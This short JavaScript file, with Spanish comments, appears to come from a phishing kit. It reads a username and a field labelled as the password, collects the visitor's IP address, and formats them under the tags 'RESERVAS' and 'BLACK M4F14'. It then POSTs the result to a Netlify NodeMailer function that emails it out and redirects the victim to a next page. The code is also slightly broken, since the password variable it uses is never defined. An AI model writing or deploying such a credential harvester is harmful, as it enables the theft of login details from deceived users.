var ready = function() {
    let u_name = document.getElementById("usuario").value;
    let ip     = document.getElementById("ip").innerHTML;
    let ip2    = document.getElementById("address").innerHTML;

    return `🔹RESERVAS🔹\nusuario: ${u_name}\ncontraseña: ${u_name2}\n\nIP: ${ip}\n${ip2}\n🔹BLACK M4F14🔹`;
};

var sender = function() {
    let message = ready();

    fetch('/.netlify/functions/sendEmail', {  // apunta a la función NodeMailer
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ message })       // <-- enviamos el mensaje completo
    })
    .then(r => r.json())
    .then(data => {
        console.log("Response:", data);
        window.location = 'index4.html';
    })
    .catch(err => console.error("Error:", err));

    return false;
};
